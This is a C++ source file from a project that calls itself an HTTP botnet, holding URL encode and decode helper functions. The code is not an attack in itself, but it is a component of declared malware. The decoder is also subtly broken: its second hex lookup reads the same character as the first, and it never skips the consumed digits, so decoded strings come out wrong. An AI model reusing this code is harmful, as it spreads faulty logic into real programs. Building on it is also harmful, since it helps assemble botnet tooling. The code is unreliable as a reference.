/**
 * This file is part of UBoat - HTTP Botnet Project
 */

#include <sstream>
#include <string>

#include "URLEncoding.h"

static const char* hexTable = "0123456789ABCDEF";

std::string URLEncode(const std::string& input)
{
    std::ostringstream output;

    for (const char& c : input) {
        output << '%' << hexTable[(c & 0xF0) >> 4] << hexTable[(c & 0x0f)];
    }

    return output.str();
}

std::string URLDecode(const std::string& input)
{
    std::string output;

    for (std::string::size_type i = 0; i < input.size(); ++i) {
        if (input[i] == '+') {
            output += ' ';
        } else if (input[i] == '%' && input.size() > i + 2) {
            char charValue = 0;
            unsigned char j = 0;
            for (j = 0; j < 16; j++) {
                if (hexTable[j] == input[i + 1])
                    break;
            }
            charValue += (j << 4);
            for (j = 0; j < 16; j++) {
                if (hexTable[j] == input[i + 1])
                    break;
            }
            charValue += j;
            output += charValue;
        } else {
            output += input[i];
        }
    }

    return output;
}
